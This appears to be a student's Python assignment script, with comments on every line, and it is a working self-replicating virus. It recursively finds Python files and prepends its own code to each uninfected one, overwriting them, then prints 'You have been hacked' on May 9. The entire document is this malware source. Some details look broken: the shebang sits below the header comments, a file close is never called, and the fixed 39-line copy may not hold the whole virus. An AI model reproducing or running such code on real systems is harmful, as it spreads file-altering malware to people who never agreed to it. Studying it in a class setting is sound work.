# Script: Ops Challenge 14
# Author: Jasmine Pressley
# Date of last revision: 12/14/23
# Purpose: Ops Challenge: 14
# Resources: ChatGPT, Class Demo

#!/usr/bin/python3
# Shebang line - specifies the interpreter to be used to execute the script

import os
import datetime

# Define a constant variable 'SIGNATURE' set to "VIRUS"
SIGNATURE = "VIRUS"

# Function 'locate' - searches for Python files and checks for a virus signature
def locate(path):
    files_targeted = []  # List to store targeted files
    filelist = os.listdir(path)  # Gets a list of files in the specified directory
    for fname in filelist:  # Loop through each file in the directory
        if os.path.isdir(path+"/"+fname):  # Check if the file is a directory
            files_targeted.extend(locate(path+"/"+fname))  # If directory, recursively search its contents
        elif fname[-3:] == ".py":  # If file is a Python file
            infected = False  # Flag to determine if the file is infected
            for line in open(path+"/"+fname):  # Loop through each line in the file
                if SIGNATURE in line:  # Check if the virus signature is present in the line
                    infected = True  # Set infected flag to True if signature is found
                    break  # Exit the loop if infected
            if infected == False:  # If the file is not infected
                files_targeted.append(path+"/"+fname)  # Add the file to the list of targeted files
    return files_targeted  # Return the list of targeted files

# Function 'infect' - adds virus code to non-infected Python files
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open this script file
    virusstring = ""
    for i,line in enumerate(virus):  # Loop through each line of the virus code
        if 0 <= i < 39:  # Grab the first 39 lines of the virus code
            virusstring += line  # Append each line to the virus string
    virus.close  # Close the virus file
    for fname in files_targeted:  # Loop through each targeted file
        f = open(fname)  # Open the file in read mode
        temp = f.read()  # Read the contents of the file
        f.close()  # Close the file
        f = open(fname,"w")  # Reopen the file in write mode (truncate existing content)
        f.write(virusstring + temp)  # Write virus code followed by the original content to the file
        f.close()  # Close the file

# Function 'detonate' - triggers an action on a specific date
def detonate():
    # Check if the current date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")  # Print a message if the date matches the trigger

# Locate Python files in the current directory and subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect non-infected Python files with the virus code
infect(files_targeted)
# Check if the current date matches the trigger date and perform an action
detonate()


